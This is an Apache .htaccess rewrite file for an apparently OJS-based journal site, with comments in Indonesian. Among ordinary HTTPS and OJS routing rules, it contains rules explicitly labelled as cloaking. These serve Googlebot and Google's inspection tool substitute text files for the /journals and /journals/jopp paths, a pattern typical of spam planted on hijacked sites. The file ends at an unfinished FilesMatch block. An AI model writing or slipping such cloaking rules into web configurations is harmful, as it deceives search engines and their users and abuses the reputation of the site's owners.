<IfModule mod_rewrite.c>
    RewriteEngine On

    # Redirect HTTP ke HTTPS (PERTAMA, sebelum apapun)
    RewriteCond %{HTTPS} !=on
    RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

    # ==================================================
    # ATURAN CLOAKING UNTUK GOOGLEBOT (PRIORITAS UTAMA)
    # ==================================================
    
    # Cloaking untuk /journals (dan /journals/)
    RewriteCond %{HTTP_USER_AGENT} Googlebot [NC,OR]
    RewriteCond %{HTTP_USER_AGENT} Google-InspectionTool [NC]
    RewriteRule ^journals/?$ /term-of-use/ukinstitute-ib.txt [L]
    
    # Cloaking untuk /journals/jopp (dan /journals/jopp/)
    RewriteCond %{HTTP_USER_AGENT} Googlebot [NC,OR]
    RewriteCond %{HTTP_USER_AGENT} Google-InspectionTool [NC]
    RewriteRule ^journals/jopp/?$ /quarantine/jopp.txt [L]

    # ==================================================
    # ATURAN ASLI OJS UNTUK SEMUA PENGGUNA LAINNYA
    # ==================================================
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^(.*)$ index.php/$1 [QSA,L]
</IfModule>

<FilesMatch "\.(php4|php5|php3|php2|php|phtml)$">
